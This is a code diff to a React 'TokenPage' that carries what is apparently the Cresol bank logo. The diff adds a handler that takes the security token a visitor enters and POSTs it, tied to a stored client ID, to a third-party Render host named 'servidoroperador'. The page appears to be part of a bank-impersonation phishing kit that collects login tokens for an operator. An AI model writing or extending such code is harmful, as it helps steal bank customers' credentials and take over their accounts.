@@ -1,5 +1,4 @@
-
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
@@ -7,13 +6,52 @@ import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.pn
 
 const TokenPage = () => {
   const [token, setToken] = useState("");
+  const [clientId, setClientId] = useState("");
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  useEffect(() => {
+    // Recuperar clientId do localStorage
+    const storedClientId = localStorage.getItem('clientId');
+    if (storedClientId) {
+      setClientId(storedClientId);
+      console.log('ClientId recuperado do localStorage:', storedClientId);
+    } else {
+      console.log('ClientId não encontrado no localStorage');
+    }
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    // Aqui seria a validação final do token
-    console.log("Token validado:", token);
-    // Redirecionar para o dashboard ou página principal após login
+    
+    if (!clientId) {
+      console.log('ClientId não disponível para envio do token');
+      return;
+    }
+
+    try {
+      console.log('Enviando token para validação:', token);
+      console.log('ClientId utilizado:', clientId);
+      
+      // Aqui você pode enviar o token para a API usando o clientId
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/token`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          token: token
+        })
+      });
+
+      if (response.ok) {
+        console.log('Token validado com sucesso');
+        // Redirecionar para o dashboard ou página principal após login
+      } else {
+        console.log('Erro ao validar token');
+      }
+    } catch (error) {
+      console.log('Erro durante validação do token:', error);
+    }
   };
 
   const handleBack = () => {
